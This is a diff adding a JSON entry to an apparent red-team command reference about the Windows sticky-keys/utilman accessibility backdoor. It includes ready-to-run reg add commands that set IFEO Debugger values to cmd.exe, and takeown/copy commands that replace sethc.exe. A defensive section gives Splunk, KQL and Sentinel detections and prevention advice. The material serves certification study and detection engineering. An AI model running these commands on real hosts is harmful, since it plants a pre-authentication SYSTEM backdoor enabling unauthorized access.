@@ -1,0 +1,103 @@
+{
+  "id": "persist-accessibility-backdoor",
+  "name": "Accessibility Feature Backdoor (sethc/utilman + IFEO Debugger)",
+  "command": "reg add \"HKLM\\...\\Image File Execution Options\\sethc.exe\" /v Debugger /d cmd.exe /f",
+  "description": "A pre-logon SYSTEM shell is obtained by abusing the Windows accessibility binaries reachable from the logon screen (sethc.exe via five Shift presses, utilman.exe via Win+U). Either replace the binary with cmd.exe/powershell, or set an Image File Execution Options (IFEO) Debugger value for sethc.exe/utilman.exe so the accessibility key launches cmd.exe as SYSTEM - usable locally or over RDP before any user authenticates.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Persistence",
+  "subcategory": "Persistence",
+  "certifications": ["CRTP"],
+  "primary_cert": "CRTP",
+  "source": "MITRE ATT&CK T1546.008; MITRE T1546.012 (IFEO); public sticky-keys backdoor research",
+  "tags": ["persistence", "accessibility", "sticky-keys", "sethc", "utilman", "ifeo", "backdoor"],
+  "mitre": ["T1546.008", "T1546.012"],
+  "exam": "exam-ok",
+  "notes": "=== TWO VARIANTS (both need admin) ===\n  1. IFEO Debugger (cleaner - no file replacement):\n     reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f\n     # at the logon screen press Shift x5 -> cmd.exe opens as SYSTEM.\n     # same for utilman.exe (triggered by Win+U).\n\n  2. Binary replacement (noisier; needs TrustedInstaller ownership):\n     takeown /f C:\\Windows\\System32\\sethc.exe & icacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F\n     copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n\n=== ACCESSIBILITY TARGETS AT THE LOGON SCREEN ===\n  sethc.exe    (Sticky Keys - 5x Shift)\n  utilman.exe  (Utility Manager - Win+U)\n  osk.exe, magnify.exe, narrator.exe, displayswitch.exe\n\n=== WHY IT EVADES / IS POWERFUL ===\n  - Works BEFORE logon, including over RDP (SYSTEM shell on the secure desktop).\n  - IFEO variant leaves the original binary intact (no hash/signature change to sethc.exe).\n\n=== ALTERNATIVES ===\n  Run keys, services, scheduled tasks - but none give a pre-auth SYSTEM shell at the logon UI.",
+  "examples": [
+    {
+      "label": "IFEO Debugger backdoor on sethc.exe (five-Shift sticky keys)",
+      "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f"
+    },
+    {
+      "label": "IFEO Debugger backdoor on utilman.exe (Win+U)",
+      "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f"
+    },
+    {
+      "label": "Hunt: list IFEO Debugger values on accessibility binaries (defender)",
+      "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" /s /v Debugger"
+    }
+  ],
+  "references": [
+    {
+      "title": "MITRE ATT&CK T1546.008 - Accessibility Features",
+      "url": "https://attack.mitre.org/techniques/T1546/008/"
+    },
+    {
+      "title": "MITRE ATT&CK T1546.012 - Image File Execution Options Injection",
+      "url": "https://attack.mitre.org/techniques/T1546/012/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "persist-registry-run-keys",
+      "note": "Run keys are a simpler logon persistence mechanism.",
+      "rel": "alternative"
+    },
+    {
+      "id": "rdp-enum",
+      "note": "The backdoor is often triggered over RDP - enumerate RDP first.",
+      "rel": "prereq"
+    },
+    {
+      "id": "persist-service-creation",
+      "note": "Service persistence is another SYSTEM-level option.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The accessibility binaries launch as SYSTEM from the logon desktop before any user authenticates. An IFEO Debugger value redirects their execution to cmd.exe, and binary replacement swaps the target outright - both documented Windows behaviours - so pressing the accessibility shortcut yields a SYSTEM shell with no credentials.",
+    "prerequisites": "Local administrator (to write the IFEO key under HKLM or to take ownership and replace the System32 binary). Physical access or RDP to reach the logon screen to trigger it.",
+    "impact": "T1546.008 / T1546.012. A pre-authentication SYSTEM command shell reachable from the logon UI (locally or over RDP), providing both persistence and a credential-free backdoor into the host.",
+    "detection": "High-fidelity: any Debugger value under Image File Execution Options\\sethc.exe/utilman.exe/osk.exe/magnify.exe/narrator.exe (Sysmon EID 13); modification or replacement of the accessibility binaries in System32 (file integrity, Sysmon EID 11/2); and the strongest tell - cmd.exe/powershell.exe whose parent is winlogon.exe (the accessibility binary launched from the secure desktop).",
+    "artifacts": "Sysmon EID 13 (RegistryValueSet) on IFEO Debugger for accessibility binaries; Sysmon EID 11 (FileCreate) or integrity change on sethc.exe/utilman.exe; Security 4688 / Sysmon EID 1 with ParentImage winlogon.exe launching a shell; takeown/icacls command history.",
+    "splunk_spl": "index=sysmon EventCode=13 TargetObject=\"*\\\\Image File Execution Options\\\\*\" TargetObject IN (\"*sethc.exe*\",\"*utilman.exe*\",\"*osk.exe*\",\"*magnify.exe*\",\"*narrator.exe*\",\"*displayswitch.exe*\") (TargetObject=\"*Debugger*\")\n| table _time, Computer, Image, TargetObject, Details",
+    "elastic_kql": "event.code:\"13\" and registry.path:*\\\\Image\\ File\\ Execution\\ Options\\\\* and registry.path:(*sethc.exe* or *utilman.exe* or *osk.exe* or *magnify.exe*) and registry.value:Debugger",
+    "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"winlogon.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\")\n| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName",
+    "sigma_rules": "registry_set_ifeo_accessibility_debugger_backdoor",
+    "prevention": "Alert on any Debugger value under IFEO for the accessibility binaries (there is never a legitimate one); monitor integrity of the System32 accessibility binaries; disable sticky-keys/accessibility shortcuts at the logon screen via policy where feasible; require Network Level Authentication for RDP so the logon desktop is not reachable pre-auth; restrict local admin and audit takeown/icacls on System32.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1546/008/",
+      "https://attack.mitre.org/techniques/T1546/012/"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "IFEO Debugger set on an accessibility binary",
+        "logic": "index=sysmon EventCode=13 TargetObject=\"*\\\\Image File Execution Options\\\\*\" TargetObject IN (\"*sethc.exe\\\\Debugger\",\"*utilman.exe\\\\Debugger\",\"*osk.exe\\\\Debugger\",\"*magnify.exe\\\\Debugger\",\"*narrator.exe\\\\Debugger\")\n| table _time, Computer, Image, TargetObject, Details",
+        "data_source": "sysmon",
+        "attack": ["T1546.012", "T1546.008"],
+        "fidelity": "signature",
+        "confidence": "high",
+        "false_positives": "Effectively none for accessibility-binary Debugger values",
+        "tuning": "Alert on any match; investigate immediately"
+      },
+      {
+        "platform": "sentinel",
+        "name": "winlogon.exe spawning a shell (secure-desktop backdoor trigger)",
+        "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"winlogon.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"powershell_ise.exe\")\n| project Timestamp, DeviceName, FileName, ProcessCommandLine",
+        "data_source": "defender-endpoint",
+        "attack": ["T1546.008"],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Extremely rare; winlogon does not normally spawn shells",
+        "tuning": "Alert on any match"
+      }
+    ],
+    "visibility": {
+      "requires": ["sysmon", "windows-security"],
+      "better_with": ["edr", "defender-endpoint"]
+    }
+  }
+}
